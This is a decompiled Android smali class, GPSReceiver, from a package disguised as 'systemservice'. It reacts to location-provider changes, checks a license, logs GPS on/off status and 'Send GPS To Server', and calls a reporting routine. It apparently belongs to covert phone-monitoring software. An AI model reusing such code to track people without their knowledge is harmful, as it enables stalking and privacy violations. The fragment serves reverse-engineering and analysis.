.class public Lcom/systemservice/common/features/gpsHistory/GPSReceiver;
.super Landroid/content/BroadcastReceiver;
.source ""


# instance fields
.field private a:Ljava/lang/String;

.field private b:I


# direct methods
.method public constructor <init>()V
    .locals 1

    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    const-string v0, "GPSReceiver"

    iput-object v0, p0, Lcom/systemservice/common/features/gpsHistory/GPSReceiver;->a:Ljava/lang/String;

    const/4 v0, 0x0

    iput v0, p0, Lcom/systemservice/common/features/gpsHistory/GPSReceiver;->b:I

    return-void
.end method


# virtual methods
.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 3

    :try_start_0
    invoke-static {p1}, Lcom/systemservice/a/a/l;->b(Landroid/content/Context;)Z

    move-result v0

    if-eqz v0, :cond_0

    iget-object p1, p0, Lcom/systemservice/common/features/gpsHistory/GPSReceiver;->a:Ljava/lang/String;

    const-string p2, "return because checkLicenseExpired() = null"

    invoke-static {p1, p2}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    return-void

    :cond_0
    const-string v0, "android.location.PROVIDERS_CHANGED"

    invoke-virtual {p2}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object p2

    invoke-virtual {v0, p2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p2

    if-eqz p2, :cond_5

    const-string p2, "location"

    invoke-virtual {p1, p2}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object p2

    check-cast p2, Landroid/location/LocationManager;

    const-string v0, "gps"

    invoke-virtual {p2, v0}, Landroid/location/LocationManager;->isProviderEnabled(Ljava/lang/String;)Z

    move-result v0

    const-string v1, "network"

    invoke-virtual {p2, v1}, Landroid/location/LocationManager;->isProviderEnabled(Ljava/lang/String;)Z

    move-result p2
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    const-string v1, "Send GPS To Server"

    if-nez v0, :cond_3

    if-eqz p2, :cond_1

    goto :goto_1

    :cond_1
    :try_start_1
    iget p2, p0, Lcom/systemservice/common/features/gpsHistory/GPSReceiver;->b:I
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    const-string v0, "GPS STATUS = Turned Off"

    const/4 v2, 0x2

    if-eq p2, v2, :cond_2

    :try_start_2
    iget p2, p0, Lcom/systemservice/common/features/gpsHistory/GPSReceiver;->b:I

    if-eqz p2, :cond_2

    iget-object p2, p0, Lcom/systemservice/common/features/gpsHistory/GPSReceiver;->a:Ljava/lang/String;

    invoke-static {p2, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    iget-object p2, p0, Lcom/systemservice/common/features/gpsHistory/GPSReceiver;->a:Ljava/lang/String;

    invoke-static {p2, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    iput v2, p0, Lcom/systemservice/common/features/gpsHistory/GPSReceiver;->b:I

    invoke-static {p1}, Lcom/systemservice/common/boostReceiver/PowerStatusReceiver;->b(Landroid/content/Context;)V

    :cond_2
    iget p2, p0, Lcom/systemservice/common/features/gpsHistory/GPSReceiver;->b:I

    if-nez p2, :cond_5

    iput v2, p0, Lcom/systemservice/common/features/gpsHistory/GPSReceiver;->b:I

    iget-object p2, p0, Lcom/systemservice/common/features/gpsHistory/GPSReceiver;->a:Ljava/lang/String;

    invoke-static {p2, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    iget-object p2, p0, Lcom/systemservice/common/features/gpsHistory/GPSReceiver;->a:Ljava/lang/String;

    invoke-static {p2, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    :goto_0
    invoke-static {p1}, Lcom/systemservice/common/boostReceiver/PowerStatusReceiver;->b(Landroid/content/Context;)V

    goto :goto_2

    :cond_3
    :goto_1
    iget p2, p0, Lcom/systemservice/common/features/gpsHistory/GPSReceiver;->b:I
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    const-string v0, "GPS STATUS = Turned On"

    const/4 v2, 0x1

    if-eq p2, v2, :cond_4

    :try_start_3
    iget p2, p0, Lcom/systemservice/common/features/gpsHistory/GPSReceiver;->b:I

    if-eqz p2, :cond_4

    iget-object p2, p0, Lcom/systemservice/common/features/gpsHistory/GPSReceiver;->a:Ljava/lang/String;

    invoke-static {p2, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    iget-object p2, p0, Lcom/systemservice/common/features/gpsHistory/GPSReceiver;->a:Ljava/lang/String;

    invoke-static {p2, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    invoke-static {p1}, Lcom/systemservice/common/boostReceiver/PowerStatusReceiver;->b(Landroid/content/Context;)V

    iput v2, p0, Lcom/systemservice/common/features/gpsHistory/GPSReceiver;->b:I

    :cond_4
    iget p2, p0, Lcom/systemservice/common/features/gpsHistory/GPSReceiver;->b:I

    if-nez p2, :cond_5

    iput v2, p0, Lcom/systemservice/common/features/gpsHistory/GPSReceiver;->b:I

    iget-object p2, p0, Lcom/systemservice/common/features/gpsHistory/GPSReceiver;->a:Ljava/lang/String;

    invoke-static {p2, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    iget-object p2, p0, Lcom/systemservice/common/features/gpsHistory/GPSReceiver;->a:Ljava/lang/String;

    invoke-static {p2, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_0

    goto :goto_0

    :catch_0
    move-exception p1

    invoke-virtual {p1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    iget-object p2, p0, Lcom/systemservice/common/features/gpsHistory/GPSReceiver;->a:Ljava/lang/String;

    invoke-virtual {p1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object p1

    invoke-static {p2, p1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    :cond_5
    :goto_2
    return-void
.end method
